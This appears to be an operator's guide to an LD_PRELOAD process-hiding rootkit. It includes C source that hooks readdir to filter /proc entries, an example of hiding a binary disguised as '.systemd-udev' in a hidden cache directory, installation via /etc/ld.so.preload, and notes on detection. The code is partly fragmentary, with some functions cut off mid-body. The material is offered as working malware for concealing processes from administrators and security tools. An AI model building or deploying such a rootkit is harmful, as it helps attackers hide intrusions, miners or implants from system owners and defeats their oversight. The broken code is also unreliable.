====================================================================
HOW IT WORKS
====================================================================

FILTERING LOGIC:
---------------
For each process in /proc, the library:

1. Reads process name from /proc/[PID]/stat
   Example: "systemd-udev"

2. Checks if name matches filter list
   "systemd-udev" == "systemd-udev" → HIDE ✅

3. Reads command line from /proc/[PID]/cmdline
   Example: "/home/user/.system_cache/.systemd-udev -c config.json"

4. Checks if path contains filtered directories
   Contains "/.system_cache/" → HIDE ✅

5. If either check matches → HIDE
   If neither match → SHOW

====================================================================
EXAMPLE: HIDING /home/user/.system_cache/.systemd-udev
====================================================================

Process details:
---------------
PID: 12345
Process name: systemd-udev
Command line: /home/user/.system_cache/.systemd-udev -c /home/user/.system_cache/config.json

Filtering steps:
---------------
Step 1: Check process name
→ "systemd-udev" in filter list? YES ✅
→ Action: HIDE

Step 2: Check command line (backup check)
→ Contains "/.system_cache/"? YES ✅
→ Action: HIDE

Result:
-------
ps aux | grep systemd-udev
→ Returns NOTHING (or only grep itself) ✅

Even if renamed:
---------------
mv .systemd-udev .my-custom-name
→ Still hidden because path contains "/.system_cache/" ✅

static const char* get_dir_name(DIR* dirp) {
    int fd = dirfd(dirp);
    if (fd == -1) return NULL;
    
    static char path_buf[4096];
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    
    ssize_t len = readlink(fd_path, path_buf, sizeof(path_buf) - 1);

static char* get_process_name(char* pid) {
    char stat_path[256];
    snprintf(stat_path, sizeof(stat_path), "/proc/%s/stat", pid);
    
    FILE* f = fopen(stat_path, "r");
    if (!f) return NULL;
    
    static char name_buf[256];
    if (fscanf(f, "%*d (%255[^)])", name_buf) != 1) {
        fclose(f);
        return NULL;
    }
    
    fclose(f);
    return name_buf;
}

static char* get_process_cmdline(char* pid) {
    char cmdline_path[256];
    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", pid);
    
    FILE* f = fopen(cmdline_path, "r");
    if (!f) return NULL;
    
    static char cmdline_buf[4096];
    size_t len = fread(cmdline_buf, 1, sizeof(cmdline_buf) - 1, f);
    fclose(f);
    
    if (len == 0) return NULL;
    
    cmdline_buf[len] = '\0';
    for (size_t i = 0; i < len; i++) {
        if (cmdline_buf[i] == '\0') cmdline_buf[i] = ' ';
    }
    
    return cmdline_buf;
}

static int should_hide_process(const char* name) {
    for (int i = 0; process_to_filter[i] != NULL; i++) {
        if (strcmp(name, process_to_filter[i]) == 0) {
            return 1;
        }
    }
    
    for (int i = 0; paths_to_filter[i] != NULL; i++) {
        if (strstr(name, paths_to_filter[i]) != NULL) {
            return 1;
        }
    }
    
    return 0;
}

struct dirent* readdir(DIR* dirp) {
    struct dirent* (*original_readdir)(DIR*);
    original_readdir = dlsym(RTLD_NEXT, "readdir");
    
    struct dirent* dir;
    
    while (1) {
        dir = original_readdir(dirp);
        if (dir == NULL) return NULL;
        
        const char* dir_name = get_dir_name(dirp);
        if (dir_name == NULL || strcmp(dir_name, "/proc") != 0) {
            return dir;
        }
        
        int is_pid = 1;
        for (int i = 0; dir->d_name[i]; i++) {
            if (dir->d_name[i] < '0' || dir->d_name[i] > '9') {
                is_pid = 0;
                break;
            }

        if (process_name == NULL) return dir;
        
        if (should_hide_process(process_name)) {
            continue;
        }
        
        char* cmdline = get_process_cmdline(dir->d_name);
        if (cmdline != NULL && should_hide_process(cmdline)) {
            continue;
        }
        
        return dir;

====================================================================
TROUBLESHOOTING
====================================================================

Q: Process still visible in ps?
A: Check if library is loaded:
   cat /etc/ld.so.preload
   Should contain: /usr/local/lib/libprocesshider.so

Q: Library not loading?
A: Check file exists:
   ls -lh /usr/local/lib/libprocesshider.so

Q: Compilation errors?
A: Install build tools:
   apt-get install gcc make
   yum install gcc make

Q: Want to unhide processes?
A: Remove from /etc/ld.so.preload:
   sed -i '/libprocesshider/d' /etc/ld.so.preload

Q: How to update process list?
A: Edit processhider.c, recompile, copy to /usr/local/lib/
   No need to modify /etc/ld.so.preload

====================================================================
SECURITY NOTES
====================================================================

1. LD_PRELOAD affects ALL processes:
   ---------------------------------
   Library is loaded into every new process
   Be careful with bugs - can break system

2. Root privileges required:
   -------------------------
   Only root can modify /etc/ld.so.preload
   User-level hiding requires root installation

3. Detection possible:
   -------------------
   Advanced users can detect LD_PRELOAD hooks
   Check: cat /etc/ld.so.preload
   Check: strings /proc/[PID]/maps | grep preload

4. Kernel-level tools can bypass:
   ------------------------------
   Tools that read /proc directly (not using libc)
   May still see hidden processes
   Example: Some security scanners
